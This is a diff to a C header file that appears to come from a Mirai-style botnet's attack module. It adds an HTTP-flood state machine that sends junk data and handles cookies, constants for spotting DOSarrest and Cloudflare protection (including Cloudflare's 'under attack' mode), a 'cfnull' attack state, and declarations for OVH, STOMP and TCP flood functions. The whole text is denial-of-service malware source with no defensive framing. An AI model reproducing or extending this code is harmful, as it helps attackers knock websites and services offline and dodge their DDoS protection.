@@ -55,7 +55,7 @@ struct Attack {
 #define ATK_VEC_TCPWRA      10
 #define ATK_VEC_OVH         11
 #define ATK_VEC_STOMP       12
-#define ATK_VEC_HTTP      13
+#define ATK_VEC_HTTP        13
 
 
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
@@ -94,6 +94,67 @@ struct attack_method {
     ATTACK_VECTOR vector;
 };
 
+#define HTTP_CONN_INIT          0 // Inital state
+#define HTTP_CONN_RESTART       1 // Scheduled to restart connection next spin
+#define HTTP_CONN_CONNECTING    2 // Waiting for it to connect
+#define HTTP_CONN_HTTPS_STUFF   3 // Handle any needed HTTPS stuff such as negotiation
+#define HTTP_CONN_SEND          4 // Sending HTTP request
+#define HTTP_CONN_SEND_HEADERS  5 // Send HTTP headers 
+#define HTTP_CONN_RECV_HEADER   6 // Get HTTP headers and check for things like location or cookies etc
+#define HTTP_CONN_RECV_BODY     7 // Get HTTP body and check for cf iaua mode
+#define HTTP_CONN_SEND_JUNK		8 // Send as much data as possible
+#define HTTP_CONN_SNDBUF_WAIT   9 // Wait for socket to be available to be written to
+#define HTTP_CONN_QUEUE_RESTART 10 // restart the connection/send new request BUT FIRST read any other available data.
+#define HTTP_CONN_CLOSED        11 // Close connection and move on
+
+#define HTTP_RDBUF_SIZE         1024
+#define HTTP_HACK_DRAIN         64
+#define HTTP_PATH_MAX           256
+#define HTTP_DOMAIN_MAX         128
+#define HTTP_COOKIE_MAX         5   // no more then 5 tracked cookies
+#define HTTP_COOKIE_LEN_MAX     128 // max cookie len
+#define HTTP_POST_MAX           512 // max post data len
+
+#define HTTP_PROT_DOSARREST     1 // Server: DOSarrest
+#define HTTP_PROT_CLOUDFLARE    2 // Server: cloudflare-nginx
+
+struct attack_http_state {
+    int fd;
+    uint8_t state;
+    int last_recv;
+    int last_send;
+    ipv4_t dst_addr;
+    char user_agent[512];
+    char path[HTTP_PATH_MAX + 1];
+    char domain[HTTP_DOMAIN_MAX + 1];
+    char postdata[HTTP_POST_MAX + 1];
+    char method[9];
+    char orig_method[9];
+
+    int protection_type;
+
+    int keepalive;
+    int chunked;
+    int content_length;
+
+    int num_cookies;
+    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];
+
+    int rdbuf_pos;
+    char rdbuf[HTTP_RDBUF_SIZE];
+};
+
+struct attack_cfnull_state {
+    int fd;
+    uint8_t state;
+    int last_recv;
+    int last_send;
+    ipv4_t dst_addr;
+    char user_agent[512];
+    char domain[HTTP_DOMAIN_MAX + 1];
+    int to_send;
+};
+
 BOOL attack_init(void);
 void attack_kill_all(void);
 int attack_parse(const unsigned char *buf, unsigned int len, struct Attack *attack);
@@ -115,7 +176,7 @@ void attack_tcpstream(uint8_t, struct attack_target *, uint8_t, struct attack_op
 void attack_wraflood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_ovh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void update_process(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
